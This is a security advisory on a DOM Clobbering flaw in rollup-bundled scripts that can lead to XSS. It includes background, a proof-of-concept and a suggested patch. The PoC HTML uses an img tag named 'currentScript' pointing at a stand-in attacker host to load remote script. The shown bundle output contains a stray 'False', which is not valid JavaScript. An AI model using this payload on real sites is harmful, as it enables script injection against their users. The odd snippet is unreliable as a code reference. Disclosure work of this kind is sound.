summary: "DOM Clobbering Gadget found in rollup bundled scripts that leads to XSS\n### Summary\n\
  \nWe discovered a DOM Clobbering vulnerability in rollup when bundling scripts that use `import.meta.url`\
  \ or with plugins that emit and reference asset files from code  in `cjs`/`umd`/`iife` format.\
  \ The DOM Clobbering gadget can lead to cross-site scripting (XSS) in web pages where scriptless\
  \ attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute)\
  \ are present.\n\nIt's worth noting that we’ve identifed similar issues in other popular bundlers\
  \ like Webpack ([CVE-2024-43788](https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986)),\
  \ which might serve as a good reference.\n\n### Details\n\n#### Backgrounds\n\nDOM Clobbering\
  \ is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly\
  \ benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets\
  \ (pieces of js code) living in the existing javascript code to transform it into executable\
  \ code. More for information about DOM Clobbering, here are some references:\n\n[1] https://scnps.co/papers/sp23_domclob.pdf\n\
  [2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/\n\n#### Gadget found in\
  \ `rollup`\n\nWe have identified a DOM Clobbering vulnerability in `rollup` bundled scripts,\
  \ particularly when the scripts uses `import.meta` and set output in format of  `cjs`/`umd`/`iife`.\
  \ In such cases, `rollup` replaces meta property with the URL retrieved from `document.currentScript`.\n\
  \nhttps://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162\n\
  \nhttps://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185\n\
  \nHowever, this implementation is vulnerable to a DOM Clobbering attack. The `document.currentScript`\
  \ lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism.\
  \ This manipulation allows an attacker to replace the intended script element with a malicious\
  \ HTML element. When this happens, the `src` attribute of the attacker-controlled element\
  \ (e.g., an `img` tag ) is used as the URL for importing scripts, potentially leading to the\
  \ dynamic loading of scripts from an attacker-controlled server.\n\n### PoC\n\nConsidering\
  \ a website that contains the following `main.js` script, the devloper decides to use the\
  \ `rollup` to bundle up the program: `rollup main.js --format cjs --file bundle.js`.\n\n```\n\
  var s = document.createElement('script')\ns.src = import.meta.url + 'extra.js'\ndocument.head.append(s)\n\
  ```\n\nThe output `bundle.js` is shown in the following code snippet.\n\n```\n'use strict';\n\
  \nvar _documentCurrentScript = typeof document !== 'undefined' ? document.currentScript :\
  \ null;\nvar s = document.createElement('script');\ns.src = (typeof document === 'undefined'\
  \ ? require('u' + 'rl').pathToFileURL(__filename).href : (_documentCurrentScript && False\
  \ && _documentCurrentScript.src || new URL('bundle.js', document.baseURI).href)) + 'extra.js';\n\
  document.head.append(s);\n```\n\nAdding the `rollup` bundled script, `bundle.js`, as part\
  \ of the web page source code, the page could load the `extra.js` file from the attacker's\
  \ domain, `attacker.controlled.server` due to the introduced gadget during bundling. The attacker\
  \ only needs to insert an `img` tag with the name attribute set to `currentScript`. This can\
  \ be done through a website's feature that allows users to embed certain script-less HTML\
  \ (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability\
  \ in third-party JavaScript loaded on the page.\n\n```\n<!DOCTYPE html>\n<html>\n<head>\n\
  \  <title>rollup Example</title>\n  <!-- Attacker-controlled Script-less HTML Element starts--!>\n\
  \  <img name=\"currentScript\" src=\"https://attacker.controlled.server/\"></img>\n  <!--\
  \ Attacker-controlled Script-less HTML Element ends--!>\n</head>\n<script type=\"module\"\
  \ crossorigin src=\"bundle.js\"></script>\n<body>\n</body>\n</html>\n```\n\n### Impact\n\n\
  This vulnerability can result in cross-site scripting (XSS) attacks on websites that include\
  \ rollup-bundled files (configured with an output format of `cjs`, `iife`, or `umd` and use\
  \ `import.meta`) and allow users to inject certain scriptless HTML tags without properly sanitizing\
  \ the `name` or `id` attributes.\n\n### Patch\n\nPatching the following two functions with\
  \ type checking would be effective mitigations against DOM Clobbering attack.\n\n```\nconst\
  \ getRelativeUrlFromDocument = (relativePath: string, umd = false) =>\n\tgetResolveUrl(\n\t\
  \t`'${escapeId(relativePath)}', ${\n\t\t\tumd ? `typeof document === 'undefined' ? location.href\
  \ : ` : ''\n\t\t}document.currentScript && document.currentScript.tagName.toUpperCase() ===\
  \ 'SCRIPT' && document.currentScript.src || document.baseURI`\n\t);\n```\n\n```\nconst getUrlFromDocument\
  \ = (chunkId: string, umd = false) =>\n\t`${\n\t\tumd ? `typeof document === 'undefined' ?\
  \ location.href : ` : ''\n\t}(${DOCUMENT_CURRENT_SCRIPT} && ${DOCUMENT_CURRENT_SCRIPT}.tagName.toUpperCase()\
  \ === 'SCRIPT' &&${DOCUMENT_CURRENT_SCRIPT}.src || new URL('${escapeId(\n\t\tchunkId\n\t)}',\
  \ document.baseURI).href)`;\n```"
